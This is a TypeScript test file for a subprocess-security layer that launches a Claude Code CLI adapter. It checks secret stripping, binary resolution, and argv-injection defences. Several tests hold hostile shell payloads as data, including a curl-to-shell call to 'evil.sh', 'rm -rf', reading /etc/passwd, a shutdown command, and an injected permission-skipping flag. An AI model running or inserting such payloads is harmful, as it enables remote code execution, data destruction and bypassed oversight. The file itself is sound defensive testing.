import assert from 'node:assert/strict'
import { test } from 'node:test'

import type { ContextPacketV1 } from '@agentroom/shared'

import { ClaudeCodeAdapter } from '../src/adapters/claude-code-adapter.js'
import {
  BinaryNotFoundError,
  buildChildEnv,
  resolveBinaryPath,
  resolveSpawnTarget,
} from '../src/lib/subprocess-security.js'

class TestClaudeCodeAdapter extends ClaudeCodeAdapter {
  args(packet: ContextPacketV1) {
    return this.buildArgs(packet)
  }
  stdin(packet: ContextPacketV1) {
    return this.buildStdin(packet)
  }
}

function packetWith(systemPrompt: string | null): ContextPacketV1 {
  return {
    schema_version: 1,
    run_id: 'run-1',
    room: {
      id: 'room-1',
      name: 'Demo',
      reply_mode: 'everyone',
      max_agent_rounds: 3,
      discussion_mode: 'independent',
    },
    agent: {
      id: 'agent-1',
      name: 'Claude Thinker',
      slug: 'claude-thinker',
      system_prompt: systemPrompt,
      provider: 'claude_code',
    },
    trigger_message: {
      id: 'msg-2',
      content: 'Answer this now',
      sender_type: 'user',
      created_at: '2026-05-16T00:01:00.000Z',
    },
    recent_messages: [
      {
        id: 'msg-2',
        content: 'Answer this now',
        sender_type: 'user',
        sender_agent_id: null,
        created_at: '2026-05-16T00:01:00.000Z',
        metadata: {},
      },
    ],
    round_index: 1,
    discussion_mode: 'independent',
    deliberation_depth: 0,
    deliberation_root_id: null,
  }
}

// --- buildChildEnv ---

test('buildChildEnv strips secrets and forwards only allowlisted vars', () => {
  const env = buildChildEnv({
    PATH: '/usr/bin',
    HOME: '/home/agent',
    SUPABASE_SERVICE_ROLE_KEY: 'super-secret',
    SUPABASE_URL: 'https://x.supabase.co',
    SOME_SECRET: 'nope',
    GITHUB_TOKEN: 'ghp_xxx',
    ANTHROPIC_API_KEY: 'sk-ant',
    OPENAI_API_KEY: 'sk-openai',
    RANDOM_APP_VAR: 'should-not-pass',
  })

  assert.equal(env['PATH'], '/usr/bin')
  assert.equal(env['HOME'], '/home/agent')
  assert.equal(env['ANTHROPIC_API_KEY'], 'sk-ant')
  assert.equal(env['OPENAI_API_KEY'], 'sk-openai')
  assert.equal(env['SUPABASE_SERVICE_ROLE_KEY'], undefined)
  assert.equal(env['SUPABASE_URL'], undefined)
  assert.equal(env['SOME_SECRET'], undefined)
  assert.equal(env['GITHUB_TOKEN'], undefined)
  assert.equal(env['RANDOM_APP_VAR'], undefined)
})

test('buildChildEnv honors BRIDGE_CHILD_ENV_ALLOW passthrough but never secrets', () => {
  const env = buildChildEnv({
    PATH: '/usr/bin',
    BRIDGE_CHILD_ENV_ALLOW: 'MY_CLI_HOME,RANDOM_APP_VAR',
    MY_CLI_HOME: '/opt/cli',
    RANDOM_APP_VAR: 'now-allowed',
    BRIDGE_SECRET_THING: 'must-stay-hidden',
  })

  assert.equal(env['MY_CLI_HOME'], '/opt/cli')
  assert.equal(env['RANDOM_APP_VAR'], 'now-allowed')
  // BRIDGE_* is a secret-pattern match and is stripped even though it is a var name.
  assert.equal(env['BRIDGE_SECRET_THING'], undefined)
})

test('buildChildEnv inject seam (ADR-0010): exactly one resolved credential var, secrets still stripped', () => {
  const env = buildChildEnv(
    {
      PATH: '/usr/bin',
      SUPABASE_SERVICE_ROLE_KEY: 'service-role-must-stay-hidden',
      SOME_API_SECRET: 'env-secret-must-stay-hidden',
    },
    { inject: { name: 'OPENAI_API_KEY', value: 'sk-resolved-byo-key' } },
  )
  // The resolved BYO credential is injected into exactly its one var...
  assert.equal(env['OPENAI_API_KEY'], 'sk-resolved-byo-key')
  // ...while process.env secrets are STILL stripped (injection doesn't widen the env).
  assert.equal(env['SUPABASE_SERVICE_ROLE_KEY'], undefined)
  assert.equal(env['SOME_API_SECRET'], undefined)
})

test('buildChildEnv inject is opt-in and name-validated (no injection by default / on bad name)', () => {
  // No inject → no extra var (a different adapter/run gets no leaked secret).
  const plain = buildChildEnv({ PATH: '/usr/bin' })
  assert.equal(plain['OPENAI_API_KEY'], undefined)
  // An invalid env name is ignored (fail-closed) — never injected as-is.
  const bad = buildChildEnv(
    { PATH: '/usr/bin' },
    { inject: { name: 'bad name; rm -rf', value: 'x' } },
  )
  assert.equal(bad['bad name; rm -rf'], undefined)
})

// --- resolveBinaryPath ---

test('resolveBinaryPath resolves a bare command from PATH', () => {
  // node itself is guaranteed to be on PATH in the test runner.
  const resolved = resolveBinaryPath(process.platform === 'win32' ? 'node' : 'node')
  assert.ok(resolved.length > 0)
  assert.match(resolved, /node/i)
})

test('resolveBinaryPath throws BinaryNotFoundError for a missing command', () => {
  assert.throws(
    () => resolveBinaryPath('definitely-not-a-real-binary-xyz-123'),
    BinaryNotFoundError,
  )
})

test('resolveBinaryPath rejects a non-existent absolute path', () => {
  const bogus = process.platform === 'win32' ? 'C:\\nope\\bogus.exe' : '/nope/bogus'
  assert.throws(() => resolveBinaryPath(bogus), BinaryNotFoundError)
})

// --- resolveSpawnTarget ---

test('resolveSpawnTarget spawns a plain binary directly', () => {
  const t = resolveSpawnTarget('/usr/local/bin/claude', ['--print'], 'linux')
  assert.deepEqual(t, { command: '/usr/local/bin/claude', args: ['--print'] })
})

test('resolveSpawnTarget routes a Windows .cmd shim through cmd.exe with static args', () => {
  const t = resolveSpawnTarget(
    'C:\\bin\\claude.cmd',
    ['--print', '--output-format', 'json'],
    'win32',
    { COMSPEC: 'C:\\Windows\\System32\\cmd.exe' },
  )
  assert.equal(t.command, 'C:\\Windows\\System32\\cmd.exe')
  assert.deepEqual(t.args, [
    '/d',
    '/s',
    '/c',
    'C:\\bin\\claude.cmd',
    '--print',
    '--output-format',
    'json',
  ])
})

// --- argv injection regression ---

test('claude adapter never puts system_prompt in argv', () => {
  const adapter = new TestClaudeCodeAdapter()
  const malicious = '"; rm -rf / #'
  const args = adapter.args(packetWith(malicious))
  assert.deepEqual(args, ['--print', '--output-format', 'json'])
  assert.ok(!args.some((a) => a.includes('rm -rf')))
})

test('claude adapter delivers system_prompt via stdin instead', () => {
  const adapter = new TestClaudeCodeAdapter()
  const stdin = adapter.stdin(packetWith('You are a helpful pirate.'))
  assert.match(stdin, /System instructions defining your persona/)
  assert.match(stdin, /helpful pirate/)
})

test('claude adapter omits the system section when no system_prompt is set', () => {
  const adapter = new TestClaudeCodeAdapter()
  const stdin = adapter.stdin(packetWith(null))
  assert.doesNotMatch(stdin, /System instructions defining your persona/)
  assert.match(stdin, /You are Claude Thinker/)
})

// Phase 11 hard gate: a *user-created* agent's system_prompt is fully
// attacker-controlled. It must reach the CLI only via stdin (data), never as an
// argv flag where shell metacharacters could be interpreted. buildArgs stays
// static regardless of how hostile the system_prompt is.
test('user-created agent system_prompt with shell metachars never reaches argv', () => {
  const adapter = new TestClaudeCodeAdapter()
  const hostile = [
    '$(curl evil.sh | sh)',
    '`rm -rf ~`',
    '"; cat /etc/passwd #',
    "' || shutdown -h now",
    '--dangerously-skip-permissions',
  ].join(' ')

  const args = adapter.args(packetWith(hostile))
  assert.deepEqual(args, ['--print', '--output-format', 'json'])
  for (const arg of args) {
    assert.ok(!arg.includes('curl'), `argv leaked system_prompt: ${arg}`)
    assert.ok(!arg.includes('rm -rf'), `argv leaked system_prompt: ${arg}`)
    assert.ok(!arg.includes('shutdown'), `argv leaked system_prompt: ${arg}`)
    assert.ok(!arg.includes('skip-permissions'), `argv leaked an injected flag: ${arg}`)
  }

  // It is present in stdin (as the persona section) — delivered as data.
  const stdin = adapter.stdin(packetWith(hostile))
  assert.match(stdin, /System instructions defining your persona/)
  assert.ok(stdin.includes('curl evil.sh'))
})
